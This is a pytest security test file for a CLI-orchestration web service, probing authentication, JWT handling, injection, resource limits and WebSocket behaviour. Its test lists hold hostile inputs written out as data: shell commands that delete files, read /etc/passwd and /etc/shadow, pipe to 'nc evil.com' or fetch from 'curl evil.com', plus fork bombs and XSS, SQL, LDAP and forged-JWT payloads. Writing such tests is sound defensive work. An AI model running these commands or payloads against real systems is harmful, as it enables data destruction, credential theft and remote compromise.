"""
Enhanced Security Tests for CLI Integration

Additional comprehensive security testing covering:
- Advanced authentication attacks
- Session fixation and hijacking
- CSRF protection
- XSS prevention in WebSocket messages
- Resource exhaustion attacks
- Timing attacks
- Cryptographic vulnerabilities
- Compliance with security best practices
"""

import base64
import json
import time
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch

import jwt
import pytest
from fastapi.testclient import TestClient

from orchestrator.app import app
from orchestrator.auth import JWT_ALGORITHM, JWT_SECRET, AuthManager


class TestAuthenticationSecurity:
    """Test authentication security vulnerabilities."""

    @pytest.fixture
    def test_client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_manager(self):
        """Create auth manager."""
        return AuthManager()

    def test_brute_force_protection(self, test_client):
        """Test protection against brute force attacks."""
        # Attempt multiple failed logins
        failed_attempts = 0

        for i in range(20):
            response = test_client.post(
                "/api/auth/login", json={"username": "admin", "password": f"wrong_{i}"}
            )

            if response.status_code == 429:  # Rate limited
                break
            elif response.status_code == 401:
                failed_attempts += 1

        # Should be rate limited before 20 attempts
        assert failed_attempts < 20

    def test_password_timing_attack_prevention(self, test_client):
        """Test prevention of timing attacks on password verification."""

        timings = []

        # Test valid username with wrong password
        for _ in range(10):
            start = time.time()
            test_client.post(
                "/api/auth/login", json={"username": "admin", "password": "wrongpassword"}
            )
            timings.append(time.time() - start)

        valid_user_avg = sum(timings) / len(timings)

        timings = []

        # Test invalid username
        for _ in range(10):
            start = time.time()
            test_client.post(
                "/api/auth/login", json={"username": "nonexistentuser", "password": "password"}
            )
            timings.append(time.time() - start)

        invalid_user_avg = sum(timings) / len(timings)

        # Timing difference should be minimal (< 50ms)
        assert abs(valid_user_avg - invalid_user_avg) < 0.05

    def test_jwt_algorithm_confusion_attack(self, test_client, auth_manager):
        """Test protection against JWT algorithm confusion attacks."""
        # Try to use 'none' algorithm
        header = {"alg": "none", "typ": "JWT"}
        payload = {
            "user_id": "admin",
            "full_access": True,
            "exp": datetime.utcnow() + timedelta(hours=1),
        }

        # Create unsigned token
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

        malicious_token = f"{header_b64.decode()}.{payload_b64.decode()}."

        # Try to use the malicious token
        response = test_client.get(
            "/api/cli/sessions", headers={"Authorization": f"Bearer {malicious_token}"}
        )

        assert response.status_code in [401, 403]

    def test_jwt_key_confusion_attack(self, test_client):
        """Test protection against RSA/HMAC key confusion."""
        # Create token with public key as HMAC secret (if RSA is supported)
        public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0B..."

        payload = {"user_id": "admin", "exp": datetime.utcnow() + timedelta(hours=1)}

        # Try to create HMAC token with public key
        malicious_token = jwt.encode(payload, public_key, algorithm="HS256")

        response = test_client.get(
            "/api/cli/sessions", headers={"Authorization": f"Bearer {malicious_token}"}
        )

        assert response.status_code in [401, 403]

    def test_session_fixation_prevention(self, test_client, auth_manager):
        """Test prevention of session fixation attacks."""
        # Create a session ID before authentication
        pre_auth_session_id = "attacker-fixed-session"

        # Attempt to login with fixed session
        response = test_client.post(
            "/api/auth/login",
            json={"username": "admin", "password": "secret", "session_id": pre_auth_session_id},
        )

        if response.status_code == 200:
            data = response.json()
            # Session ID should be regenerated, not the attacker's
            assert data.get("session_id") != pre_auth_session_id


class TestInputValidationSecurity:
    """Test input validation and injection prevention."""

    @pytest.fixture
    def test_client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_token(self):
        """Create valid auth token."""
        auth_manager = AuthManager()
        return auth_manager.generate_jwt_token("test_user")

    def test_command_injection_prevention(self, test_client, auth_token):
        """Test prevention of command injection attacks."""
        malicious_commands = [
            "ls; rm -rf /",
            "echo test && cat /etc/passwd",
            "test | nc evil.com 4444",
            "$(curl evil.com/script.sh)",
            "`whoami`",
            "test\n; cat /etc/shadow",
            "test; python -c 'import os; os.system(\"rm -rf /\")'",
            "../../../../../../etc/passwd",
        ]

        for cmd in malicious_commands:
            with patch(
                "orchestrator.cli_session_manager.CLISessionManager.send_input_to_session"
            ) as mock_send:
                mock_send.return_value = True

                response = test_client.post(
                    "/api/cli/sessions/test-session/command",
                    json={"command": cmd},
                    headers={"Authorization": f"Bearer {auth_token}"},
                )

                # Commands should be properly escaped/sanitized
                if mock_send.called:
                    sent_command = mock_send.call_args[0][1]
                    # Dangerous patterns should be escaped or rejected
                    assert ";" not in sent_command or sent_command == cmd

    def test_path_traversal_prevention(self, test_client, auth_token):
        """Test prevention of path traversal attacks."""
        traversal_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\sensitive",
        ]

        for path in traversal_paths:
            response = test_client.post(
                "/api/cli/sessions",
                json={"provider": "claude", "working_directory": path},
                headers={"Authorization": f"Bearer {auth_token}"},
            )

            # Should reject or sanitize dangerous paths
            if response.status_code == 200:
                data = response.json()
                # Working directory should be sanitized
                assert ".." not in data.get("working_directory", "")

    def test_xss_prevention_in_websocket(self, test_client, auth_token):
        """Test XSS prevention in WebSocket messages."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
        ]

        with test_client.websocket_connect("/ws/cli/test-session") as websocket:
            # Send auth
            websocket.send_json({"type": "auth", "data": {"token": auth_token}})

            for payload in xss_payloads:
                websocket.send_json({"type": "command", "data": {"command": payload}})

                # Response should have escaped HTML
                response = websocket.receive_json()
                if "data" in response and "output" in response["data"]:
                    output = response["data"]["output"]
                    # Check that HTML tags are escaped
                    assert "<script>" not in output
                    assert "javascript:" not in output

    def test_sql_injection_prevention(self, test_client, auth_token):
        """Test SQL injection prevention (if SQL is used)."""
        sql_payloads = [
            "'; DROP TABLE sessions; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ]

        for payload in sql_payloads:
            response = test_client.get(
                f"/api/cli/sessions?user_id={payload}",
                headers={"Authorization": f"Bearer {auth_token}"},
            )

            # Should handle SQL injection attempts safely
            assert response.status_code in [200, 400, 404]

    def test_ldap_injection_prevention(self, test_client):
        """Test LDAP injection prevention (if LDAP is used)."""
        ldap_payloads = [
            "*)(uid=*",
            "admin)(|(password=*",
            "*)(objectClass=*",
        ]

        for payload in ldap_payloads:
            response = test_client.post(
                "/api/auth/login", json={"username": payload, "password": "test"}
            )

            # Should handle LDAP injection safely
            assert response.status_code in [400, 401]


class TestResourceExhaustionProtection:
    """Test protection against resource exhaustion attacks."""

    @pytest.fixture
    def test_client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_token(self):
        """Create valid auth token."""
        auth_manager = AuthManager()
        return auth_manager.generate_jwt_token("test_user")

    def test_memory_exhaustion_prevention(self, test_client, auth_token):
        """Test prevention of memory exhaustion attacks."""
        # Try to create very large payload
        large_payload = "A" * (10 * 1024 * 1024)  # 10MB

        response = test_client.post(
            "/api/cli/sessions/test/command",
            json={"command": large_payload},
            headers={"Authorization": f"Bearer {auth_token}"},
        )

        # Should reject or limit large payloads
        assert response.status_code in [400, 413, 507]

    def test_cpu_exhaustion_prevention(self, test_client, auth_token):
        """Test prevention of CPU exhaustion attacks."""
        # Try regex DoS (ReDoS)
        redos_patterns = [
            "(a+)+b",
            "([a-zA-Z]+)*",
            "(a*)*b",
        ]

        for pattern in redos_patterns:
            test_string = "a" * 100

            response = test_client.post(
                "/api/cli/sessions/search",
                json={"pattern": pattern, "text": test_string},
                headers={"Authorization": f"Bearer {auth_token}"},
            )

            # Should have timeout or pattern validation
            assert response.status_code in [200, 400, 408]

    def test_connection_limit_enforcement(self, test_client, auth_token):
        """Test enforcement of connection limits."""
        connections = []
        max_allowed = 0

        try:
            for i in range(100):
                try:
                    ws = test_client.websocket_connect(f"/ws/cli/session-{i}")
                    connections.append(ws.__enter__())
                    max_allowed += 1
                except:
                    break
        finally:
            # Clean up
            for conn in connections:
                try:
                    conn.__exit__(None, None, None)
                except:
                    pass

        # Should enforce some connection limit
        assert max_allowed < 100

    def test_session_limit_per_user(self, test_client, auth_token):
        """Test session limit per user."""
        session_count = 0

        for i in range(50):
            response = test_client.post(
                "/api/cli/sessions",
                json={"provider": "claude"},
                headers={"Authorization": f"Bearer {auth_token}"},
            )

            if response.status_code == 200:
                session_count += 1
            elif response.status_code in [429, 507]:
                break

        # Should enforce session limit
        assert session_count < 50

    def test_fork_bomb_prevention(self, test_client, auth_token):
        """Test prevention of fork bomb attacks."""
        fork_bombs = [
            ":(){ :|:& };:",
            "while true; do bash & done",
            "bomb() { bomb | bomb & }; bomb",
        ]

        for bomb in fork_bombs:
            with patch(
                "orchestrator.cli_session_manager.CLISessionManager.send_input_to_session"
            ) as mock_send:
                # Command should be rejected or sandboxed
                mock_send.return_value = False

                response = test_client.post(
                    "/api/cli/sessions/test/command",
                    json={"command": bomb},
                    headers={"Authorization": f"Bearer {auth_token}"},
                )

                # Should reject dangerous commands
                assert response.status_code in [400, 403]


class TestCryptographicSecurity:
    """Test cryptographic security measures."""

    @pytest.fixture
    def auth_manager(self):
        """Create auth manager."""
        return AuthManager()

    def test_secure_random_generation(self, auth_manager):
        """Test secure random number generation."""
        tokens = set()

        # Generate multiple tokens
        for _ in range(1000):
            token = auth_manager.generate_jwt_token("user")
            payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
            tokens.add(payload["jti"])

        # All JTIs should be unique
        assert len(tokens) == 1000

        # Check randomness quality (basic check)
        for jti in list(tokens)[:10]:
            # Should look like UUID
            assert len(jti) >= 32
            assert "-" in jti or len(jti) == 32

    def test_password_hashing_security(self):
        """Test password hashing security."""
        from orchestrator.auth import pwd_context

        password = "TestPassword123!"

        # Generate multiple hashes
        hashes = [pwd_context.hash(password) for _ in range(5)]

        # All hashes should be different (salted)
        assert len(set(hashes)) == 5

        # Hashes should be bcrypt format
        for h in hashes:
            assert h.startswith("$2") or h.startswith("$argon2")

    def test_constant_time_comparison(self, auth_manager):
        """Test constant-time comparison for sensitive data."""
        import hmac

        secret1 = "secret_value_123"
        secret2 = "secret_value_123"
        secret3 = "different_value_"

        # Should use constant-time comparison
        assert hmac.compare_digest(secret1, secret2) is True
        assert hmac.compare_digest(secret1, secret3) is False

    def test_secure_session_tokens(self):
        """Test session token security."""
        import secrets

        tokens = set()

        for _ in range(1000):
            token = secrets.token_urlsafe(32)
            tokens.add(token)

        # All tokens should be unique
        assert len(tokens) == 1000

        # Tokens should have sufficient entropy
        for token in list(tokens)[:10]:
            assert len(token) >= 32


class TestPrivilegeEscalation:
    """Test privilege escalation prevention."""

    @pytest.fixture
    def test_client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def user_token(self):
        """Create regular user token."""
        auth_manager = AuthManager()
        return auth_manager.generate_jwt_token("regular_user")

    @pytest.fixture
    def admin_token(self):
        """Create admin token."""
        auth_manager = AuthManager()
        token = auth_manager.generate_jwt_token("admin_user")
        # Mock admin privileges
        return token

    def test_vertical_privilege_escalation(self, test_client, user_token):
        """Test prevention of vertical privilege escalation."""
        # Try to access admin endpoints
        admin_endpoints = [
            ("/api/admin/users", "GET"),
            ("/api/admin/config", "POST"),
            ("/api/admin/logs", "GET"),
        ]

        for endpoint, method in admin_endpoints:
            if method == "GET":
                response = test_client.get(
                    endpoint, headers={"Authorization": f"Bearer {user_token}"}
                )
            else:
                response = test_client.post(
                    endpoint, json={}, headers={"Authorization": f"Bearer {user_token}"}
                )

            # Should deny access
            assert response.status_code in [403, 404]

    def test_horizontal_privilege_escalation(self, test_client, user_token):
        """Test prevention of horizontal privilege escalation."""
        # Try to access another user's resources
        with patch(
            "orchestrator.cli_session_manager.CLISessionManager.get_session_info"
        ) as mock_info:
            mock_info.return_value = MagicMock(user_id="other_user")

            response = test_client.get(
                "/api/cli/sessions/other-user-session",
                headers={"Authorization": f"Bearer {user_token}"},
            )

            # Should deny access to other user's session
            assert response.status_code in [403, 404]

    def test_parameter_tampering(self, test_client, user_token):
        """Test prevention of parameter tampering."""
        # Try to modify privileged parameters
        response = test_client.post(
            "/api/cli/sessions",
            json={
                "provider": "claude",
                "full_access": True,  # Try to enable full access
                "admin_mode": True,  # Try to enable admin mode
                "sudo": True,  # Try to enable sudo
            },
            headers={"Authorization": f"Bearer {user_token}"},
        )

        if response.status_code == 200:
            data = response.json()
            # Should not grant elevated privileges
            assert data.get("full_access") is not True
            assert data.get("admin_mode") is not True

    def test_jwt_claims_tampering(self, test_client):
        """Test prevention of JWT claims tampering."""
        # Create token with modified claims
        auth_manager = AuthManager()
        token = auth_manager.generate_jwt_token("user")

        # Try to decode and modify
        parts = token.split(".")
        if len(parts) == 3:
            # Decode payload
            payload = base64.urlsafe_b64decode(parts[1] + "==")
            payload_dict = json.loads(payload)

            # Modify claims
            payload_dict["full_access"] = True
            payload_dict["role"] = "admin"

            # Re-encode
            new_payload = (
                base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).decode().rstrip("=")
            )

            # Create tampered token
            tampered = f"{parts[0]}.{new_payload}.{parts[2]}"

            response = test_client.get(
                "/api/cli/sessions", headers={"Authorization": f"Bearer {tampered}"}
            )

            # Should reject tampered token
            assert response.status_code in [401, 403]


class TestWebSocketSecurity:
    """Test WebSocket-specific security."""

    @pytest.fixture
    def test_client(self):
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_token(self):
        """Create valid auth token."""
        auth_manager = AuthManager()
        return auth_manager.generate_jwt_token("test_user")

    def test_websocket_origin_validation(self, test_client, auth_token):
        """Test WebSocket origin validation."""
        # Try connection with invalid origin
        headers = {"Origin": "http://evil.com", "Authorization": f"Bearer {auth_token}"}

        try:
            with test_client.websocket_connect("/ws/cli/test", headers=headers) as ws:
                # Should reject or validate origin
                pass
        except:
            # Connection should be rejected
            pass

    def test_websocket_message_size_limit(self, test_client, auth_token):
        """Test WebSocket message size limits."""
        with test_client.websocket_connect("/ws/cli/test") as ws:
            # Send auth
            ws.send_json({"type": "auth", "data": {"token": auth_token}})

            # Try to send huge message
            huge_message = {
                "type": "command",
                "data": {"command": "A" * (10 * 1024 * 1024)},  # 10MB
            }

            try:
                ws.send_json(huge_message)
                response = ws.receive_json()
                # Should handle large messages gracefully
                assert response["type"] in ["error", "status"]
            except:
                # Connection might be closed
                pass

    def test_websocket_protocol_validation(self, test_client, auth_token):
        """Test WebSocket protocol validation."""
        with test_client.websocket_connect("/ws/cli/test") as ws:
            # Send invalid message formats
            invalid_messages = [
                "plain text",
                {"no_type": "field"},
                {"type": 123},  # Invalid type
                {"type": "invalid_type"},
                None,
                [],
                123,
            ]

            for msg in invalid_messages:
                try:
                    if isinstance(msg, str):
                        ws.send_text(msg)
                    else:
                        ws.send_json(msg)

                    response = ws.receive_json()
                    # Should handle invalid messages
                    assert response["type"] in ["error", "status"]
                except:
                    # Connection might close on invalid protocol
                    pass


class TestComplianceAndBestPractices:
    """Test compliance with security best practices."""

    @pytest.fixture
    def test_client(self):
        """Create test client."""
        return TestClient(app)

    def test_security_headers(self, test_client):
        """Test presence of security headers."""
        response = test_client.get("/api/health")

        headers = response.headers

        # Check for security headers
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000",
        }

        for header, expected_values in security_headers.items():
            if header in headers:
                if isinstance(expected_values, list):
                    assert headers[header] in expected_values
                else:
                    assert headers[header] == expected_values

    def test_secure_cookie_flags(self, test_client):
        """Test secure cookie flags."""
        response = test_client.post(
            "/api/auth/login", json={"username": "test", "password": "test"}
        )

        if "set-cookie" in response.headers:
            cookie = response.headers["set-cookie"]

            # Check secure flags
            assert "Secure" in cookie or "secure" in cookie
            assert "HttpOnly" in cookie or "httponly" in cookie
            assert "SameSite" in cookie or "samesite" in cookie

    def test_error_message_information_disclosure(self, test_client):
        """Test that errors don't leak sensitive information."""
        # Trigger various errors
        error_triggers = [
            ("/api/nonexistent", 404),
            ("/api/cli/sessions/nonexistent", 404),
            ("/api/internal-error", 500),
        ]

        for endpoint, expected_status in error_triggers:
            response = test_client.get(endpoint)

            if response.status_code == expected_status:
                # Check error doesn't contain sensitive info
                error_text = response.text.lower()

                # Should not contain
                assert "traceback" not in error_text
                assert "stack trace" not in error_text
                assert "/home/" not in error_text
                assert "password" not in error_text
                assert "secret" not in error_text
                assert "token" not in error_text

    def test_audit_logging(self):
        """Test that security events are logged."""
        # This would check if security events are properly logged
        # Implementation depends on logging configuration
        pass

    def test_input_length_limits(self, test_client):
        """Test input length limits are enforced."""
        auth_manager = AuthManager()
        token = auth_manager.generate_jwt_token("test")

        # Test various input fields
        long_string = "A" * 10000

        test_cases = [
            ("/api/auth/login", {"username": long_string, "password": "test"}),
            ("/api/cli/sessions", {"provider": long_string}),
            ("/api/cli/sessions/test/command", {"command": long_string}),
        ]

        for endpoint, payload in test_cases:
            response = test_client.post(
                endpoint, json=payload, headers={"Authorization": f"Bearer {token}"}
            )

            # Should reject or truncate long inputs
            assert response.status_code in [200, 400, 413]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
